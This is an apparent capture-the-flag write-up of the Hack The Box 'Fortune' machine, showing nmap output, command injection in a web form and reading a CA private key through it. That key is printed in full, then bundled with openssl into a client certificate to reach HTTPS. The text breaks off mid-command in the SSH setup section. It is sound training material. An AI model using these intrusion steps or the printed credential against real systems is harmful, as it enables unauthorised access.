@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <writeup>
+        <h1><strong>hackthebox Fortune</strong></h1>
+        <em>Released: 9th March 2019 / Pwned: July 6th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Fortune isn't particulary tricky. It's obscure. The machine relies upon, at times, well-known but uncommon processes, like port-forwarding and certificate bundling. The initial entry is so painstakingly put in front of your face that it's quite easy to miss. And getting root is essentially a source-code review task, which is a challenge I've come across only once so far on hackthebox. The machine felt like it was designed to teach you more advanced techniques, and that it does very well; without any CTF shenanigans or foolery.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Have your fortune told, and then inject some commands into that fortune<br>
+        • Find a key and a certificate<br>
+        • Bundle the 2 together to access 443 and gain ssh access<br>
+        • Portforward a locally running nfs service and mount it<br>
+        • Impersonate a privileged user and gain access by writing to their <code>authorized_keys</code> file<br>
+        • Snoop on some emails, find a database file and read some interesting strings from it<br>
+        • Read the source code of the app to understand how to the interesting string is encrypted<br>
+        • Decrypt the string using code from the source code<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.127</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/fortune#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.127<br>
+                ...<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.127<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.049s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;997&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.9&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e&nbsp;(ED25519)<br>
+                80/tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenBSD&nbsp;httpd<br>
+                |_http-server-header:&nbsp;OpenBSD&nbsp;httpd<br>
+                |_http-title:&nbsp;Fortune<br>
+                443/tcp&nbsp;open&nbsp;&nbsp;ssl/https?<br>
+                |_ssl-date:&nbsp;ERROR:&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;(use&nbsp;-d&nbsp;to&nbsp;debug)<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        A full port scan didn't reveal anything new.<br>
+        <br>
+        <strong>Ports:</strong><br>
+        • 22/ssh - there's nothing to do here for the time being.<br>
+        • 80/http - a website called <code>Fortune</code>.<br>
+        • 443/https - nmap isn't sure what this is. If you visit the site yourself, you get a timeout. Come back to this port later.<br>
+        <br>
+        The only option from here, then, is 80/http.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2>
+        <code>http://10.10.10.127/</code><br>
+        We can choose a fortune for ourselves.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) Command Injection</strong></h3><br>
+        If we choose the <code>fortunes</code> database, we're given a fortune.<br>
+        <br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        This page is outputting the contents of a database/table/column, which makes me suspicious of vulnerabilities existing on this page.<br>
+        <br>
+        If you look at the request to <code>http://10.10.10.127/select</code> in Burp you'll see the <code>db</code> data specifying the chosen database being sent.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <code>db</code> is vulnerable to command injection.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) Retrieve certificate keys</strong></h3><br>
+        You can snoop around most of the system using the command injection vuln.<br>
+        <br>
+        Check the <code>/home</code> folder to see real users on the system (useful later)<br>
+            <div class="codebox">
+                total&nbsp;20<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;5&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;13&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512B&nbsp;Jul&nbsp;&nbsp;4&nbsp;07:17&nbsp;..<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;5&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;bob<br>
+                drwxr-x---&nbsp;&nbsp;&nbsp;3&nbsp;charlie&nbsp;&nbsp;charlie&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;5&nbsp;&nbsp;2018&nbsp;charlie<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;2&nbsp;nfsuser&nbsp;&nbsp;nfsuser&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;nfsuser
+            </div>
+        </div><br>
+        <br>
+        Inside <code>bob</code>'s home folder, you'll find a <code>ca</code> (certificate authority) folder that holds website certificates.<br>
+        <code>ls -alh /home/bob</code><br>
+            <div class="codebox">
+                /home/bob:<br>
+                total&nbsp;48<br>
+                drwxr-xr-x&nbsp;&nbsp;5&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;5&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;87B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.Xdefaults<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;771B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.cshrc<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;101B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.cvsrc<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;359B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.login<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;175B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.mailrc<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;215B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.profile<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;.psql_history<br>
+                drwx------&nbsp;&nbsp;2&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;.ssh<br>
+                drwxr-xr-x&nbsp;&nbsp;7&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;ca<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;bob&nbsp;&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;dba
+            </div>
+        </div><br>
+        <br>
+        <code>ls -alh /home/bob/ca</code><br>
+            <div class="codebox">
+                drwxr-xr-x&nbsp;&nbsp;7&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;512B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;5&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;..<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;512B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;certs<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;512B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;crl<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;115B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;index.txt<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;21B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;index.txt.attr<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;index.txt.old<br>
+                drwxr-xr-x&nbsp;&nbsp;7&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;intermediate<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;512B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;newcerts<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;4.1K&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;openssl.cnf<br>
+                drwx------&nbsp;&nbsp;2&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;512B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;private<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;serial<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;bob&nbsp;&nbsp;bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5B&nbsp;Oct&nbsp;29&nbsp;&nbsp;2018&nbsp;serial.old
+            </div>
+        </div><br>
+        <br>
+        The public and private key for the root certificate authority are in the <code>private</code> folder, but we don't have permissions read the private key.<br>
+        <br>
+        However, <code>bob</code> is also using an intermediate certificate authority. This can be used to sign certificate signing requests instead of the root certificate, which adds an extra layer of security to the certificate. If the intermediate certificate's private key is compromised (which can be used to sign certificates for other sites/users), the root certificate can revoke the intermediate authority's permissions, which in turn will revoke all certificates that intermediate authority has signed.<br>
+        <br>
+        Fortunately, we can read both the intermediate authority's public certificate and private key<br>
+        • <code>cat /home/bob/ca/intermediate/private/intermediate.key.pem</code> - private key<br>
+        • <code>cat /home/bob/ca/intermediate/certs/intermediate.cert.pem</code> - public certificate<br>
+        <br>
+        We can bundle both of these files together to create a certificate that can be used with Firefox and gain access to the 443/https site.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Create .p12 certificate bundle</strong></h2><br>
+        To be used with Firefox, the certificate bundle has to archived into a <code>PKCS#12</code> format, or <code>.p12</code>, which is a format for storing cryptographic objects.<br>
+        <br>
+        Make a directory to store all the keys/bundle<br>
+        <code>root@gotham:~/ctf/fortune# mkdir openss<br>
+        root@gotham:~/ctf/fortune# cd openssl</code><br>
+        <code>root@gotham:~/ctf/fortune/openssl#</code><br>
+        <br>
+        <code>echo</code> both the certificates into files.<br>
+        <br>
+        The public certificate:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune/openssl#&nbsp;echo&nbsp;"-----BEGIN&nbsp;CERTIFICATE-----<br>
+                &gt;&nbsp;MIIFxDCCA6ygAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwbTELMAkGA1UEBhMCQ0Ex<br>
+                &gt;&nbsp;CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYGA1UEAwwP<br>
+                &gt;&nbsp;Rm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVuZS5odGIw<br>
+                &gt;&nbsp;HhcNMTgxMDMwMDA1NjQzWhcNMjgxMDI3MDA1NjQzWjB1MQswCQYDVQQGEwJDQTEL<br>
+                &gt;&nbsp;MAkGA1UECAwCT04xFzAVBgNVBAoMDkZvcnR1bmUgQ28gSFRCMSAwHgYDVQQDDBdG<br>
+                &gt;&nbsp;b3J0dW5lIEludGVybWVkaWF0ZSBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1<br>
+                &gt;&nbsp;bmUuaHRiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuTGpzUbl4RIy<br>
+                &gt;&nbsp;DuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6NTzZAjOvCAJu7tiJjnvrUxf4SzuLR<br>
+                &gt;&nbsp;QEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd99fN/MDz288Rv7Z24LKWvPoEFWU5D<br>
+                &gt;&nbsp;SpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1oW/kbz9205JT1LvR+mqNWbH/0Q92K<br>
+                &gt;&nbsp;7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI97sB6jXxlgHzblwFlQaHvh6H7u6rC<br>
+                &gt;&nbsp;m/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL6YmfIsPJdu4NoeEeXofqwQjNf2bs<br>
+                &gt;&nbsp;jgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/SybEGB3vBe4e+wvzkT7YD4lqubvXZ<br>
+                &gt;&nbsp;O346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVoKmimYUWi2fJ/1B2PgRrzv/mmlgL7<br>
+                &gt;&nbsp;JOpJNWMUbc8bEf698QziuCXj5R/+Lover058nrvCAnI4I4wUHTGAgOC1J4hbVoYX<br>
+                &gt;&nbsp;EjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xpANJIlxH0gwaTQ4a8HAPBliHnEV0v<br>
+                &gt;&nbsp;XK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb7K4H1yh5VF9zkLCTN6WYoaSM1Z0T<br>
+                &gt;&nbsp;nb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEAAaNmMGQwHQYDVR0OBBYEFNBS/hId<br>
+                &gt;&nbsp;Md8NPcYbC32/OSwFbZzUMB8GA1UdIwQYMBaAFFOdNrSGE+IcSQJs1UTIogSJ2i5W<br>
+                &gt;&nbsp;MBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMA0GCSqGSIb3DQEB<br>
+                &gt;&nbsp;CwUAA4ICAQAJ0/abFm23OqxhuRPiGr7VfRn8DbsyQ7oVB8zxJsgfgWkXTKuTtJti<br>
+                &gt;&nbsp;zhZSFR8/JMUYhRLwdkjf8w3hA7GKF9VS3kioEDGROtx++ZQc1ljI7owLfDYfhQ08<br>
+                &gt;&nbsp;0CJiXxmwO4XupL23cxu9i9464+knHvqvE1Uhj/L9HO5pVD5uAS2kePnSju7n08gg<br>
+                &gt;&nbsp;miqzREAc0qzehpoJXuS50wJc4otGgU5l+Rsen8giWdR0a1TxKm2UF/wFQbSU+WwY<br>
+                &gt;&nbsp;8F5PquwOz384mmQ/3k6SVj6HStCFb47bHEpvS5mvj2lzJMiLFtYkzSe2fDJJ444I<br>
+                &gt;&nbsp;1Y4UXIOE/nKK/UDw4tOquxcYVD0oJ0lxpFhpSVtRu9R5cqYPJI2POQTj6Ucb7i+3<br>
+                &gt;&nbsp;OpY+NpJ0mjem7/d1yCDtKIbz4pcJoaAtVQVDdzywPTe3LcdnGutvfiYJZJW/ENNG<br>
+                &gt;&nbsp;z3Iw0vkQCeJTsUMg45x88QzAg8IG0jkqT0PEhXD6ul4fAgm0/8BCuEwNuMz9mHc9<br>
+                &gt;&nbsp;DFhdfx5zU8OYUVpw4UB8IC2wbybyW+ftkcsfLngYasH3cZa1GpXq/qDByCW2C8kg<br>
+                &gt;&nbsp;z4mKdO3yVIf087hyfCKWSH9OAH1FEDnhkWbLhkGcJENrIJuO7CNYRyBIjd1jxtUv<br>
+                &gt;&nbsp;HinFDCeM/GeMJr2W154CniHjtXoiEeZ8LRY73qESZBqXukWxbOa7sA==<br>
+                &gt;&nbsp;-----END&nbsp;CERTIFICATE-----"&nbsp;&gt;&nbsp;intermediate_pubkcert.pem
+            </div>
+        </div><br>
+        <br>
+        And the private key:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune/openssl#&nbsp;echo&nbsp;"-----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+                &gt;&nbsp;MIIJKQIBAAKCAgEAuTGpzUbl4RIyDuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6N<br>
+                &gt;&nbsp;TzZAjOvCAJu7tiJjnvrUxf4SzuLRQEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd9<br>
+                &gt;&nbsp;9fN/MDz288Rv7Z24LKWvPoEFWU5DSpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1o<br>
+                &gt;&nbsp;W/kbz9205JT1LvR+mqNWbH/0Q92K7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI9<br>
+                &gt;&nbsp;7sB6jXxlgHzblwFlQaHvh6H7u6rCm/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL<br>
+                &gt;&nbsp;6YmfIsPJdu4NoeEeXofqwQjNf2bsjgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/S<br>
+                &gt;&nbsp;ybEGB3vBe4e+wvzkT7YD4lqubvXZO346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVo<br>
+                &gt;&nbsp;KmimYUWi2fJ/1B2PgRrzv/mmlgL7JOpJNWMUbc8bEf698QziuCXj5R/+Lover058<br>
+                &gt;&nbsp;nrvCAnI4I4wUHTGAgOC1J4hbVoYXEjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xp<br>
+                &gt;&nbsp;ANJIlxH0gwaTQ4a8HAPBliHnEV0vXK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb<br>
+                &gt;&nbsp;7K4H1yh5VF9zkLCTN6WYoaSM1Z0Tnb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEA<br>
+                &gt;&nbsp;AQKCAgEAkjfD+W+g0LOtElN2TtYewtRAPVYc+9ogRKq28PUtpEemGccLix8qmBkM<br>
+                &gt;&nbsp;c66B5qwAO+WPWUPhVbd/v2OIiqQYbnfGe7p1klwCg7sYlg2ilyaLX2tA6I/4O/3m<br>
+                &gt;&nbsp;fVD7joCYiafHVXJI5toEBz4znHdidokaQOODcE0A9ig1pIuKrX3Ktghl/TgR3W0P<br>
+                &gt;&nbsp;BesWKpyf2ThdZA0irvKcXaY3fpxBOxho5CV8WW8KpBld70Uu79v0OdGPVJJkMJGn<br>
+                &gt;&nbsp;EmuCdReE+u0AUfZy6xlHzhs5/DUEwkP3gwSCs0IICyDnEQPkfn3cOIKCdUFTg/9R<br>
+                &gt;&nbsp;cbVCzi0P7VMi5oYsugppezeBjiX+EDQogYDpSF94aFy8FdG6UgGLUpicNyG93niL<br>
+                &gt;&nbsp;iXTJ0X0MS1E1AWSvECguIuUaNuDW+ZOdMCGoKKVCjTzHGvMunSP5ibIhSprhf4v0<br>
+                &gt;&nbsp;KrBxalXAZafq6jVrEkQkNQrVVaodkFMFH4+J3Sa8Zi1mOiQ9xFmGMV+8AUiz899J<br>
+                &gt;&nbsp;4PHcf7WzLb/FilyhwIM3HPSI7n3mJ0x7xkuQ3COxioVbvCkz0fAaQzz1U8h/pFxV<br>
+                &gt;&nbsp;+wfx2X5F3N8RzU5ufR/M/Asni8RId7M8TJ44qWQln8itM+0aWTKiLrhBOcC55eug<br>
+                &gt;&nbsp;hHIop2z+amPqxsynTVbbmiVwGpCYGNt3Q/7/FovcxF36hkbULwECggEBAPPgQwX4<br>
+                &gt;&nbsp;gL9PBBwSi2oCS+164tSTc0B3R31B0AatewdXyASNYml9rCTOa/VJntvIAHDvWQ3+<br>
+                &gt;&nbsp;wfrf34/1DIdZttwPYpcKAiWz/CXqPqEhd3uFLOrRoo1xBaenwLvCI99cYEvcrQIF<br>
+                &gt;&nbsp;ctBDsqGytJ/Begs7dg04KLZUbsoYVTzkwf9O0I1aEHY4r9cUfXyPBYFl1qJdJoY1<br>
+                &gt;&nbsp;83sZAZo+DXLdmtXVpoM/8MlhnMfg9VQ+txrMZg+1zEiuiNY9Rmv6CDpx68WcNKxF<br>
+                &gt;&nbsp;y6mEkR8Ux3ZdHht/9azTU9n2btsx3EPBviwgiXuPLdCwyjfopcUaj+2cX9n5dO5E<br>
+                &gt;&nbsp;HFZXUnQKj5UgttcCggEBAMJmkplp9ofzkF17Z+B6u/PJHmFKBn/PgD1NKBlGINIY<br>
+                &gt;&nbsp;wh/3mFq1AvqHqy9Y9q9H+S/rIr8i+ADi39lWUywYWbGxpTJ6q68tKJR2UVxP0otZ<br>
+                &gt;&nbsp;CRqtqV/BUhADeXrxnSdTEtA9CTgLEn+fHbDGwzW1nhB/EsEfQFQBx31juR2k5kR3<br>
+                &gt;&nbsp;LFpiex3zAvVYOuM9fkHsCp5rDsvv10/6+aUzVOXwYzNfDBU9PpdK0AnTy0rijXM4<br>
+                &gt;&nbsp;4Ky6/DFEMRCh1yC/O99u8AomyvlPJXyOFlrijUikBGpBUE60zB0dFw62NlBZg0BX<br>
+                &gt;&nbsp;po2sJnPZYgERFCb2jCK2SJnWWgtPvQbwHqXBLj4uxPUCggEBALEHSP/LjQHSRORv<br>
+                &gt;&nbsp;3b29HwqrWn7+7fmM3Fsja/N8+MKyyOHtE9QJwu0Q3rM2ltdpjlBsnhOXq44F9s4U<br>
+                &gt;&nbsp;Dt0tlZyWmnWTcU2XImEPchkbJxWF7b4jIMFVmspB7pkc61dXQhuve/Lsq5RcoA3a<br>
+                &gt;&nbsp;oF0bYBFJP3+HFZ6NGcMf+Lf0QpKmzqLdDvgSXCpfmFvToiZ1G2HPBokEHtNrqosh<br>
+                &gt;&nbsp;ojeQf7XbmjzKLGqyrdE2Dj/yKo6Mc0XSLRFRiMkjv7vfyxtJ2OEga+fl3loWfhW2<br>
+                &gt;&nbsp;yre0Dofd0iN7X/Hnfj8lKYQR3o8/qy0DGTnVK2V8PuEeT/4mtjmPaH8Q+BUA3DyZ<br>
+                &gt;&nbsp;8fJJxg8CggEAJ+AoZAWjRyHD1BkTJq2mTgxMCgLIMIFcubZQ6lZDNzVS5IHCI6EL<br>
+                &gt;&nbsp;ml4n1A94kl2+FIEz4GcI3g2rgwY9C0d3Zoac7yzQeJ9XupRGfhv1gRXjUzCaFIUw<br>
+                &gt;&nbsp;Ew7TZU+YP8+/hS1v7an/wmPeEDvFIQg/Av092JVTeaffxq2k9Bq2DQcw9t1Kicsm<br>
+                &gt;&nbsp;KTNO6PvdISKMzxAAuf5ZeRNvD97mpD/Z6ViuvtCQPTJgWBO0mIi+IQtisqusPWLS<br>
+                &gt;&nbsp;eano2dPAMUWtQTfR3K/KbbErjrr35hWWvkDley+EytgDucXQgEzMKm+QP3E3df36<br>
+                &gt;&nbsp;J2PccV2TQy+G1t9sGvPhP0IT10Y3+RNY3QKCAQBCgyEOu2PEHO4FHHJsyXSN9als<br>
+                &gt;&nbsp;OZa+sOykZ/7fdjBZpAsjvcmxUfAxT07+EVUz4Wo186BKlthQjVLoLd2QfeTYmGhj<br>
+                &gt;&nbsp;IsZnjm0Ds8ezFka/3Cu7YwGt6MBfUO6Vq2MLlUDgvtcWPTvBvipfmfZtJ0x2hhNv<br>
+                &gt;&nbsp;y6Lpg/KJrald3NHrIcS4GvE8gxz1AFmMM0j00EuJSZk66hpC2bBKMunXAquPDN3g<br>
+                &gt;&nbsp;XPwjyvXUcxDf8Jx1MGFfO++6RlZMEO7jmB/xgonPkWP4xEcQlOQ65UfhpLjfum96<br>
+                &gt;&nbsp;Ma9MyI3TStZzH998nMBc3LsUbXnDr0yofBt1AsLz3JsBHcgRIxYzzvtlIpjk<br>
+                &gt;&nbsp;-----END&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----"&nbsp;&gt;&nbsp;intermediate_privkey.pem
+            </div>
+        </div><br>
+        <br>
+        Bundle the intermediate certificate and the intermediate private key together into a <code>.p12</code> file using <code>openssl</code>.<br>
+        I've used a password of <code>pls</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune/openssl#&nbsp;openssl&nbsp;pkcs12&nbsp;-export&nbsp;-clcerts&nbsp;-in&nbsp;intermediate_pubcert.pem&nbsp;-inkey&nbsp;intermediate_privkey.pem&nbsp;-out&nbsp;intermediate_hijack.p12<br>
+                Enter&nbsp;Export&nbsp;Password:&nbsp;pls<br>
+                Verifying&nbsp;-&nbsp;Enter&nbsp;Export&nbsp;Password:&nbsp;pls
+            </div>
+        </div><br>
+        <br>
+        Import that <code>.p12</code> into firefox.<br>
+        Preferences &gt; Privacy &amp; Security &gt; View Certficates &gt; Your Certificates &gt; Import<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        Using this certificate, we can now access port 443!<br>
+        Make sure to turn off burp so that you can select your newly-crafted certificate when you first visit the site.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) 443/https</strong></h2><br>
+        <code>https://10.10.10.127/</code><br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        We're told that we can get ssh access to the system if we generate a key pair.<br>
+        Click <code>generate</code>.<br>
+        <br>
+        <code>https://10.10.10.127/generate</code><br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        And we're given a public key and it's corresponding private key.<br>
+        We can use the private key to log in to the system.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Configure ssh</strong></h2><br>
+        <code>echo</code> the private key you were given into a file in the <code>.ssh</code> directory in your <code>/home</code> folder.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;echo&nbsp;"-----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
